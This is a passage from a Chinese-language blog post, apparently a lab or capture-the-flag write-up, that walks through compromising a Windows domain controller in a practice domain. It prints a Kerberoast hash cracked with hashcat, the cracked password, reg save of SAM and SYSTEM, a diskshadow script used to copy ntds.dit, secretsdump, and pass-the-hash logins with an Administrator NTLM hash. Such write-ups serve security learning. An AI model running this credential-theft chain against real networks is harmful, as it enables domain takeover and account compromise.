+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">$krb5tgs$23$*tianjing$XIAORANG.LAB$xiaorang.lab/tianjing*$bf879e774759456daf103777ad9af90d$4a4de18d66ea3c67bae2249d6f7111fb129dc414e16f7919032694689c5dfa24d6812ccb0bd2b41adf6750d65c0b463f8fec3dea3102dbb2aec81bd4709e5d8220f10170f25b40706c3595c26c9270e3ee74c55a2c3bf8a331afb9f258b56c75a33d4d1eb917a5f42ccb0e314038fe0d81a939f87514722111263df070a8add429e99817cc568e6dd7a8631f054fd844048adf050bfb1deb50634bdd55942225f10b79d6996d781a5027b36c951ff207ca0d1d14b90d1e7d6542abb7930a311bdf3c70711819f503d8b7e1177017299b8d594efbb7453ff63b7e834192896905ad9dcf2d56d62f9882b96b4eebf111bc719ba3dfda365b9e8b4066a3a8f04453f54f5fab6278c7e8ddff61f26cb6040baac01e7831390c3eafc26c8cda1064bb5a315c2224bc891a88f9db904861f1085e7d899720599936c9027b05f5198e3f0fea64e2920be2e8dbc97735667104e7d60658c178c5721433e9a2270ed2b5c5f66364da1778d8a790075cd069d74af8a44a78dd0888792a737fbbde5350120ff962e4925688177b47bec14762c24adb311506a7ac0f23ee5e780828f953c84c8629380755777f439a183cbc803d7f53f6715ea0603f6720f7035fcb931b51405f31d444a4a54978c0b9827ff41f0a47d97ba6547d3e2ff3dfabab9d7d276f7dd757fa1b706cfbf377d77d35d24023f32686944faf69d1aedf00e786ee01b85fd8adfc0f8d8c25fb4e0f58780a0290e45a40f5cf75a0af127b9d9481a92f78926a9498deea1e9f60c9216cb806a409718501bee7841dd4267ef636c37f1f17454a71c5f67555df6bbb5f2d947ff79090713e3155bdfef57c117940a48db78089b6be20903fe6d66426f839332a3ba209e5503cff4881d5c98573b7639ba9ed68f64d073a3d095694a19c08bfc9ca9efcc2dd9fbac00dea0c892f576a73132d705d4ff6f370098bb6cdd5986af2fc7d201431561476ddef1df74c8915943cf014c4c41e201025445898eded8720a9376da287a297ff8ab2a8f349ebff00724a5c5fd421103002a7b1581f4d687b07287c64d504ab4e884e362ced5cfa772c5a6bd6eb3e427a988f10cc6a3cecfd635a1b71a4a2005221733aeb5b69174253c08b6dd38468278ed4f28fc2a70f6c0aad0f6148c5a7456512669677b42ae75cf6612709f93ba69b994e8c6d806d9dbe2b90f9a91f7f412b9759ecb07eec4d5d94b089af36ecabc8bb11209d880b41c766bc043d59c3733871d6ce2b836392cab76082624633167e1604756d47a84c36fe3833341f6abc9a25fefb5e125128c3e5b96df7b6427ee246d6015c976988c8799934d961f5ffa780f5eb586c15f8de35a90637d568b4f47dff3aa864489d28cbfb61a0b7f8106cde05160ae36549589b72f74a59bf70942ae81e1a78b92abf7b32232b0496481dc0d9cb0c931613bd2ade64073f1f90760e7b4b977d71cdfeb0c2aebf14c62d
+</span></span></code></pre></div></div><p>爆破一下</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">hashcat -m 13100 -a 0 1.txt /usr/share/wordlists/rockyou.txt --force
+</span></span></code></pre></div></div><p><code>DPQSXSXgh2</code></p>
+<p>拿到密码,直接横向</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2 
+</span></span></code></pre></div></div><p>登录到域控</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419173155.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419173155.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>有备份以及还原文件或目录的权限，可以卷影拷贝然后读sam(SAM是安全账户管理器数据库，包含了本地用户及用户组,包括它们的口令及其他属性，位于注册表的HKLM__SAM下面)</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">reg save HKLM\SAM sam.hive
+</span></span><span class="line"><span class="cl">reg save HKLM\SYSTEM system.hive
+</span></span></code></pre></div></div><p>上传一个文件</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">set context persistent nowriters
+</span></span><span class="line"><span class="cl">add volume c: alias raj
+</span></span><span class="line"><span class="cl">create
+</span></span><span class="line"><span class="cl">expose %raj% z:
+</span></span></code></pre></div></div><p>转成windows格式 <code>unix2dos raj.dsh</code></p>
+<p>然后再上传</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">upload /home/kali/copy_website/raj.dsh
+</span></span><span class="line"><span class="cl">diskshadow /s raj.dsh
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">Microsoft DiskShadow 版本 1.0
+</span></span><span class="line"><span class="cl">版权所有 (C) 2013 Microsoft Corporation
+</span></span><span class="line"><span class="cl">在计算机上: XR-DC，2024/4/19 17:36:04
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-&gt; set context persistent nowriters
+</span></span><span class="line"><span class="cl">-&gt; add volume c: alias raj
+</span></span><span class="line"><span class="cl">-&gt; create
+</span></span><span class="line"><span class="cl">已将卷影 ID {7b6bd5cf-e02f-4703-a9fd-66030cd8db7b} 的别名 raj 设置为环境变量。
+</span></span><span class="line"><span class="cl">已将卷影集 ID {fe1ac6e2-a342-4889-bef1-09aa8825f758} 的别名 VSS_SHADOW_SET 设置为环境变量。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">正在查询卷影副本集 ID 为 {fe1ac6e2-a342-4889-bef1-09aa8825f758} 的所有卷影副本
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  * 卷影副本 ID = {7b6bd5cf-e02f-4703-a9fd-66030cd8db7b}      %raj%
+</span></span><span class="line"><span class="cl">    - 卷影副本集: {fe1ac6e2-a342-4889-bef1-09aa8825f758}  %VSS_SHADOW_SET%
+</span></span><span class="line"><span class="cl">    - 卷影副本原始数 = 1
+</span></span><span class="line"><span class="cl">    - 原始卷名称: \\?\Volume{4790f32e-0000-0000-0000-100000000000}\ [C:\]
+</span></span><span class="line"><span class="cl">    - 创建时间: 2024/4/19 17:36:05
+</span></span><span class="line"><span class="cl">    - 卷影副本设备名称: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+</span></span><span class="line"><span class="cl">    - 原始计算机: XR-DC.xiaorang.lab
+</span></span><span class="line"><span class="cl">    - 服务计算机: XR-DC.xiaorang.lab
+</span></span><span class="line"><span class="cl">    - 未暴露
+</span></span><span class="line"><span class="cl">    - 提供程序 ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+</span></span><span class="line"><span class="cl">    - 属性:  No_Auto_Release Persistent No_Writers Differential
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">已列出的卷影副本数: 1
+</span></span><span class="line"><span class="cl">-&gt; expose %raj% z:
+</span></span><span class="line"><span class="cl">-&gt; %raj% = {7b6bd5cf-e02f-4703-a9fd-66030cd8db7b}
+</span></span><span class="line"><span class="cl">已成功将卷影副本暴露为 z:\。
+</span></span><span class="line"><span class="cl">-&gt;
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>复制到当前目录</p>
+<p><code>RoboCopy /b z:\windows\ntds . ntds.dit</code></p>
+<p><code>impacket-secretsdump -ntds ntds.dit -system system local</code></p>
+<p><code>proxychains evil-winrm -i 172.22.14.11 -u Administrator -H &quot;70c39b547b7d8adec35ad7c09fb1d277&quot;</code></p>
+<p><code>aad3b435b51404eeaad3b435b51404ee:70c39b547b7d8adec35ad7c09fb1d277</code></p>
+<p>拿下域控,这期考的都是privilege</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">p4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:70c39b547b7d8adec35ad7c09fb1d277 Administrator@172.22.9.7 -codec gbk
+</span></span></code></pre></div></div></article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/%e6%97%a0%e9%97%b4%e8%ae%a1%e5%88%92" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">无间计划</p>
+            </a>
+            
+
+            
+            <a href="/post/spoofing" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">Spoofing</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
